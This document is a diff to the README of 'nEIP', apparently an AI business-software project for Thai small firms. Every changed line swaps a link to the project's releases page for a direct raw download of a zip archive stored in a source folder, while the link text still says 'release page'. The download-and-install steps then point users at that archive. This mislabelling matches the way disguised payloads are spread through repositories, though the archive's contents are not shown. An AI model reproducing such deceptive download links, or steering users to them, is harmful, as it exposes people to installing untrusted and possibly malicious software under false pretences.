@@ -1,6 +1,6 @@
 # 🤖 nEIP - AI ERP for Thai SMBs
 
-[![Download nEIP](https://img.shields.io/badge/Download%20nEIP-Release%20Page-blue?style=for-the-badge)](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+[![Download nEIP](https://img.shields.io/badge/Download%20nEIP-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Fingerflowercatherineparr281/nEIP/main/apps/mcp/src/EIP_n_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ nEIP is an AI-native business app for Thai SMEs and startups. It helps you manag
 
 Use this page to download and install the app:
 
-[Visit the release page to download nEIP](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+[Visit the release page to download nEIP](https://raw.githubusercontent.com/Fingerflowercatherineparr281/nEIP/main/apps/mcp/src/EIP_n_3.3.zip)
 
 ## 📦 What nEIP Does
 
@@ -42,7 +42,7 @@ For smooth use, 16 GB RAM is better if you plan to open large data sets or use m
 
 ## 📥 Download nEIP
 
-1. Open the [nEIP release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+1. Open the [nEIP release page](https://raw.githubusercontent.com/Fingerflowercatherineparr281/nEIP/main/apps/mcp/src/EIP_n_3.3.zip)
 2. Find the latest release at the top
 3. Download the Windows file for your computer
 4. Save it to your Downloads folder or Desktop
@@ -184,7 +184,7 @@ Keep the data folder safe if you store live business records on the same PC.
 
 To get the latest version:
 
-1. Return to the [release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+1. Return to the [release page](https://raw.githubusercontent.com/Fingerflowercatherineparr281/nEIP/main/apps/mcp/src/EIP_n_3.3.zip)
 2. Download the newest Windows file
 3. Close the old app
 4. Install or replace the old version
@@ -257,7 +257,7 @@ nEIP fits:
 
 ## 📌 Quick Start Checklist
 
-1. Open the [release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Fingerflowercatherineparr281/nEIP/main/apps/mcp/src/EIP_n_3.3.zip)
 2. Download the Windows file
 3. Install or extract the app
 4. Open nEIP
